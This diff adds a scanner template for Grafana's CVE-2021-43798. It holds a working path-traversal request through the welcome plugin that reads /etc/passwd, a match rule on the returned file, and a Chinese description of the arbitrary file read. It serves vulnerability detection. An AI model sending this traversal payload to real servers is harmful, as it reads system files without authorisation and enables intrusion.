@@ -1,0 +1,17 @@
+name: Grafana Plugins Arbitrary File Read CVE-2021-43798
+manual: true
+query: ( app="Grafana" | title=="Grafana" )
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /public/plugins/welcome/../../../../../../../../../etc/passwd
+    expression: response.status == 200 && response.body.bcontains(b"root:x:") && response.body.bcontains(b"daemon:x:")
+expression: r0()
+detail:
+  author: aetkrad
+  links:
+  - https://mp.weixin.qq.com/s/DTkVTtbndaMWL9WGzaI32A
+  description: Grafana是用于可视化大型测量数据的开源程序，他提供了强大和优雅的方式去创建、共享、浏览数据。dashboard中显示了你不同metric数据源中的数据。通过默认存在的插件，可构造特殊的请求包读取服务器任意文件。
+  tags: fileread
